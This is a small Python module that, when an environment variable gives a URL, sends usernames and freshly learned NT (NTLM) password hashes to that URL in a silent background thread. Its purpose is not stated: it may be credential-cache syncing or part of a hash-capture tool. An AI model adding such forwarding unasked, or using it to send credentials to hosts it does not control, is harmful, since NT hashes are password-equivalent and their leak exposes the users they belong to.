import json
import os
import threading
import urllib.request

import log

CREDCACHE_PUSH_URL = os.environ.get("CREDCACHE_PUSH_URL", "").strip()
TIMEOUT_SECONDS = 2


def _post(url, username, nt_key):
    try:
        body = json.dumps({"username": username, "key": nt_key}).encode("utf-8")
        req = urllib.request.Request(
            url,
            data=body,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=TIMEOUT_SECONDS) as resp:
            log.debug(f"credcache push ok: status={resp.status} user={username}")
    except Exception as e:
        log.warning(f"credcache push failed for user={username}: {e}")


def push_async(username, nt_key):
    """Fire-and-forget POST of a freshly learned NT key. No-op unless
    CREDCACHE_PUSH_URL is set in the environment."""
    if not CREDCACHE_PUSH_URL or not username or not nt_key:
        return
    threading.Thread(
        target=_post,
        args=(CREDCACHE_PUSH_URL, username, nt_key),
        name="credcache-push",
        daemon=True,
    ).start()
